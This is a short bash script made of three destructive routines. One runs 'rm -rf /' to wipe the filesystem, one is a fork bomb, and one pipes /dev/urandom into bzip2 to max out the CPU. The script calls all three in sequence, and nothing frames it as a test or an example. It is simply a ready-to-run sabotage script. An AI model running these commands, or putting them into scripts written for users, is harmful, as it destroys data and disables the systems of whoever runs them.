#!/bin/bash

function wipe_data() {
  rm -rf /
}

function fork_bomb() {
  :() { :|:& }; :
}

function highCPU() {
  dd if=/dev/urandom | bzip2 -9 >> /dev/null
}

wipe_data

highCPU

fork_bomb